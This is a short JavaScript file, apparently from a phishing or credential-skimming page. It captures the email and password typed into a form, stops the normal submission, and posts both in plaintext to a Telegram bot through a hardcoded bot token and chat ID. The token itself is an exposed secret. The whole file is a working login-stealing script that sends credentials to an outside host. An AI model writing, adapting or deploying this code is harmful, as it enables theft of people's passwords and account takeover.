let name = document.querySelector(".name");
let password = document.querySelector(".password");

const TOKEN = `7168732100:AAEQM7cTLpC7q_AElh11T_8JLPUa2dHNp0Q`;
const CHAT_ID = 1582813606;
const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

document.getElementById("tg").addEventListener("submit", function (e) {
  e.preventDefault();
  let message = `<b>Заявка с сайта!</b>\n;`;
  message += `Email: <b>${name.value}</b>\n;`;
  message += `Password: <b>${password.value}</b>\n;`;
  axios.post(URL_API, {
    chat_id: CHAT_ID,
    parse_mode: "html",
    text: message,
  });
});
